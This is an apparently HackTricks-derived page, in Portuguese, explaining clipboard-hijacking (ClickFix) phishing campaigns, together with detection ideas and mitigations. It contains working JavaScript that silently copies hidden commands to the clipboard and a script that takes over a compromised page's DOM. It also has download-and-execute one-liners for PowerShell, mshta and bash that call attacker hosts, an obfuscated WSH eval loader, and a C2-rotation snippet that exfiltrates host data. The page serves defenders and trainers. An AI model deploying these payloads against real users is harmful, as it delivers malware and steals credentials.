# Clipboard Hijacking (Pastejacking) Attacks

{{#include ../../banners/hacktricks-training.md}}

> "Nunca cole nada que você não tenha copiado você mesmo." – conselho antigo, mas ainda válido

## Visão geral

Clipboard hijacking – também conhecido como *pastejacking* – explora o fato de que usuários rotineiramente copiam e colam comandos sem inspecioná‑los. Uma página web maliciosa (ou qualquer contexto com suporte a JavaScript, como uma aplicação Electron ou Desktop) coloca programaticamente texto controlado pelo atacante na área de transferência do sistema. As vítimas são incentivadas, normalmente por instruções de engenharia social cuidadosamente elaboradas, a pressionar **Win + R** (caixa Executar), **Win + X** (Acesso Rápido / PowerShell), ou abrir um terminal e *colar* o conteúdo da área de transferência, executando imediatamente comandos arbitrários.

Porque **nenhum arquivo é baixado e nenhum anexo é aberto**, a técnica contorna a maioria dos controles de segurança de e-mail e de conteúdo web que monitoram anexos, macros ou execução direta de comandos. O ataque é, portanto, popular em campanhas de phishing que entregam famílias de malware commodity como NetSupport RAT, Latrodectus loader ou Lumma Stealer.

## Prova de conceito em JavaScript
```html
<!-- Any user interaction (click) is enough to grant clipboard write permission in modern browsers -->
<button id="fix" onclick="copyPayload()">Fix the error</button>
<script>
function copyPayload() {
const payload = `powershell -nop -w hidden -enc <BASE64-PS1>`; // hidden PowerShell one-liner
navigator.clipboard.writeText(payload)
.then(() => alert('Now press  Win+R , paste and hit Enter to fix the problem.'));
}
</script>
```
Campanhas mais antigas usavam `document.execCommand('copy')`, as mais recentes dependem da assíncrona **Clipboard API** (`navigator.clipboard.writeText`).

## Fluxo ClickFix / ClearFake

1. O usuário visita um site typosquatted ou comprometido (por exemplo `docusign.sa[.]com`)
2. O JavaScript **ClearFake** injetado chama um helper `unsecuredCopyToClipboard()` que armazena silenciosamente um PowerShell one-liner codificado em Base64 na área de transferência.
3. Instruções em HTML dizem à vítima: *“Pressione **Win + R**, cole o comando e pressione Enter para resolver o problema.”*
4. `powershell.exe` é executado, baixando um arquivo que contém um executável legítimo e uma DLL maliciosa (classic DLL sideloading).
5. O loader descriptografa estágios adicionais, injeta shellcode e instala persistência (por exemplo scheduled task) – eventualmente executando NetSupport RAT / Latrodectus / Lumma Stealer.

### Exemplo de cadeia NetSupport RAT
```powershell
powershell -nop -w hidden -enc <Base64>
# ↓ Decodes to:
Invoke-WebRequest -Uri https://evil.site/f.zip -OutFile %TEMP%\f.zip ;
Expand-Archive %TEMP%\f.zip -DestinationPath %TEMP%\f ;
%TEMP%\f\jp2launcher.exe             # Sideloads msvcp140.dll
```
* `jp2launcher.exe` (Java WebStart legítimo) procura em seu diretório por `msvcp140.dll`.
* A DLL maliciosa resolve dinamicamente APIs com **GetProcAddress**, baixa dois binários (`data_3.bin`, `data_4.bin`) via **curl.exe**, descriptografa-os usando uma rolling XOR key `"https://google.com/"`, injeta o shellcode final e extrai **client32.exe** (NetSupport RAT) para `C:\ProgramData\SecurityCheck_v1\`.

### Latrodectus Loader
```
powershell -nop -enc <Base64>  # Cloud Identificator: 2031
```
1. Baixa `la.txt` com **curl.exe**
2. Executa o downloader JScript dentro do **cscript.exe**
3. Busca um MSI payload → drops `libcef.dll` ao lado de uma aplicação assinada → DLL sideloading → shellcode → Latrodectus.

### Lumma Stealer via MSHTA
```
mshta https://iplogger.co/xxxx =+\\xxx
```
A chamada **mshta** lança um script PowerShell oculto que recupera `PartyContinued.exe`, extrai `Boat.pst` (CAB), reconstrói `AutoIt3.exe` através de `extrac32` & file concatenation e finalmente executa um script `.a3x` que exfiltra credenciais do browser para `sumeriavgv.digital`.

## ClickFix: Clipboard → PowerShell → JS eval → Startup LNK with rotating C2 (PureHVNC)

Algumas campanhas ClickFix pulam completamente os downloads de arquivos e instruem as vítimas a colar um one‑liner que busca e executa JavaScript via WSH, o persiste e rotaciona o C2 diariamente. Exemplo de cadeia observada:
```powershell
powershell -c "$j=$env:TEMP+'\a.js';sc $j 'a=new
ActiveXObject(\"MSXML2.XMLHTTP\");a.open(\"GET\",\"63381ba/kcilc.ellrafdlucolc//:sptth\".split(\"\").reverse().join(\"\"),0);a.send();eval(a.responseText);';wscript $j" Prеss Entеr
```
Principais características
- URL ofuscada invertida em tempo de execução para derrotar inspeção casual.
- JavaScript se mantém persistente via um Startup LNK (WScript/CScript), e seleciona o C2 pelo dia atual — permitindo rotação rápida de domínios.

Fragmento JS mínimo usado para rotacionar C2s por data:
```js
function getURL() {
var C2_domain_list = ['stathub.quest','stategiq.quest','mktblend.monster','dsgnfwd.xyz','dndhub.xyz'];
var current_datetime = new Date().getTime();
var no_days = getDaysDiff(0, current_datetime);
return 'https://'
+ getListElement(C2_domain_list, no_days)
+ '/Y/?t=' + current_datetime
+ '&v=5&p=' + encodeURIComponent(user_name + '_' + pc_name + '_' + first_infection_datetime);
}
```
A próxima etapa normalmente implanta um loader que estabelece persistência e baixa um RAT (por exemplo, PureHVNC), frequentemente fazendo pinning de TLS a um certificado pré‑definido e fragmentando o tráfego.

Detection ideas specific to this variant
- Árvore de processos: `explorer.exe` → `powershell.exe -c` → `wscript.exe <temp>\a.js` (ou `cscript.exe`).
- Artefatos de inicialização: LNK em `%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup` invocando WScript/CScript com um caminho JS sob `%TEMP%`/`%APPDATA%`.
- Registro/RunMRU e telemetria de linha de comando contendo `.split('').reverse().join('')` ou `eval(a.responseText)`.
- Repetidos `powershell -NoProfile -NonInteractive -Command -` com grandes payloads via stdin para alimentar scripts longos sem linhas de comando extensas.
- Scheduled Tasks que subsequentemente executam LOLBins como `regsvr32 /s /i:--type=renderer "%APPDATA%\Microsoft\SystemCertificates\<name>.dll"` sob uma tarefa/caminho com aparência de updater (por exemplo, `\GoogleSystem\GoogleUpdater`).

Caça a ameaças
- Hostnames e URLs de C2 rotativos diariamente com padrão `.../Y/?t=<epoch>&v=5&p=<encoded_user_pc_firstinfection>`.
- Correlacione eventos de gravação do clipboard seguidos por colagem via Win+R e então execução imediata de `powershell.exe`.

Blue-teams podem combinar telemetria de clipboard, criação de processos e registro para identificar abuso de pastejacking:

* Registro do Windows: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU` mantém um histórico de **Win + R** commands – procure entradas Base64 / ofuscadas incomuns.
* Security Event ID **4688** (Process Creation) onde `ParentImage` == `explorer.exe` e `NewProcessName` em { `powershell.exe`, `wscript.exe`, `mshta.exe`, `curl.exe`, `cmd.exe` }.
* Event ID **4663** para criações de arquivos sob `%LocalAppData%\Microsoft\Windows\WinX\` ou pastas temporárias logo antes do evento 4688 suspeito.
* EDR clipboard sensors (if present) – correlate `Clipboard Write` seguido imediatamente por um novo processo PowerShell.

## IUAM-style verification pages (ClickFix Generator): clipboard copy-to-console + OS-aware payloads

Campanhas recentes produzem em massa páginas falsas de verificação de CDN/browser ("Just a moment…", IUAM-style) que coagiam usuários a copiar comandos específicos do SO do seu clipboard para consoles nativos. Isso desloca a execução para fora do sandbox do navegador e funciona tanto em Windows quanto em macOS.

Principais características das páginas geradas pelo builder
- Detecção do SO via `navigator.userAgent` para adaptar payloads (Windows PowerShell/CMD vs. macOS Terminal). Iscas/no-ops opcionais para SOs não suportados para manter a ilusão.
- Cópia automática para clipboard em ações de UI benignas (checkbox/Copy) enquanto o texto visível pode diferir do conteúdo do clipboard.
- Bloqueio móvel e um popover com instruções passo a passo: Windows → Win+R→colar→Enter; macOS → abrir Terminal→colar→Enter.
- Ofuscação opcional e injector de arquivo único para sobrescrever o DOM de um site comprometido com uma UI de verificação estilizada com Tailwind (não é necessário registro de novo domínio).

Example: clipboard mismatch + OS-aware branching
```html
<div class="space-y-2">
<label class="inline-flex items-center space-x-2">
<input id="chk" type="checkbox" class="accent-blue-600"> <span>I am human</span>
</label>
<div id="tip" class="text-xs text-gray-500">If the copy fails, click the checkbox again.</div>
</div>
<script>
const ua = navigator.userAgent;
const isWin = ua.includes('Windows');
const isMac = /Mac|Macintosh|Mac OS X/.test(ua);
const psWin = `powershell -nop -w hidden -c "iwr -useb https://example[.]com/cv.bat|iex"`;
const shMac = `nohup bash -lc 'curl -fsSL https://example[.]com/p | base64 -d | bash' >/dev/null 2>&1 &`;
const shown = 'copy this: echo ok';            // benign-looking string on screen
const real = isWin ? psWin : (isMac ? shMac : 'echo ok');

function copyReal() {
// UI shows a harmless string, but clipboard gets the real command
navigator.clipboard.writeText(real).then(()=>{
document.getElementById('tip').textContent = 'Now press Win+R (or open Terminal on macOS), paste and hit Enter.';
});
}

document.getElementById('chk').addEventListener('click', copyReal);
</script>
```
macOS persistence da execução inicial
- Use `nohup bash -lc '<fetch | base64 -d | bash>' >/dev/null 2>&1 &` para que a execução continue após o terminal ser fechado, reduzindo artefatos visíveis.

In-place page takeover em sites comprometidos
```html
<script>
(async () => {
const html = await (await fetch('https://attacker[.]tld/clickfix.html')).text();
document.documentElement.innerHTML = html;                 // overwrite DOM
const s = document.createElement('script');
s.src = 'https://cdn.tailwindcss.com';                     // apply Tailwind styles
document.head.appendChild(s);
})();
</script>
```
Detecção & hunting ideias específicas para iscas estilo IUAM
- Web: Páginas que vinculam Clipboard API a widgets de verificação; discrepância entre o texto exibido e o clipboard payload; ramificação por `navigator.userAgent`; Tailwind + single-page replace em contextos suspeitos.
- Windows endpoint: `explorer.exe` → `powershell.exe`/`cmd.exe` pouco depois de uma interação com o browser; instaladores batch/MSI executados a partir de `%TEMP%`.
- macOS endpoint: Terminal/iTerm iniciando `bash`/`curl`/`base64 -d` com `nohup` perto de eventos do browser; background jobs sobrevivendo ao fechamento do terminal.
- Correlacione o histórico `RunMRU` do Win+R e as escritas na clipboard com a criação subsequente de processos de console.

See also for supporting techniques

{{#ref}}
clone-a-website.md
{{#endref}}

{{#ref}}
homograph-attacks.md
{{#endref}}

## Mitigations

1. Browser hardening – desabilitar clipboard write-access (`dom.events.asyncClipboard.clipboardItem` etc.) ou exigir user gesture.
2. Security awareness – ensinar os usuários a *digitar* comandos sensíveis ou colá-los primeiro em um editor de texto.
3. PowerShell Constrained Language Mode / Execution Policy + Application Control para bloquear one-liners arbitrários.
4. Network controls – bloquear requisições outbound para domínios conhecidos de pastejacking e C2 de malware.

## Related Tricks

* **Discord Invite Hijacking** frequentemente abusa da mesma abordagem ClickFix após atrair usuários para um servidor malicioso:

{{#ref}}
discord-invite-hijacking.md
{{#endref}}

## References

- [Fix the Click: Preventing the ClickFix Attack Vector](https://unit42.paloaltonetworks.com/preventing-clickfix-attack-vector/)
- [Pastejacking PoC – GitHub](https://github.com/dxa4481/Pastejacking)
- [Check Point Research – Under the Pure Curtain: From RAT to Builder to Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [The ClickFix Factory: First Exposure of IUAM ClickFix Generator](https://unit42.paloaltonetworks.com/clickfix-generator-first-of-its-kind/)

{{#include ../../banners/hacktricks-training.md}}
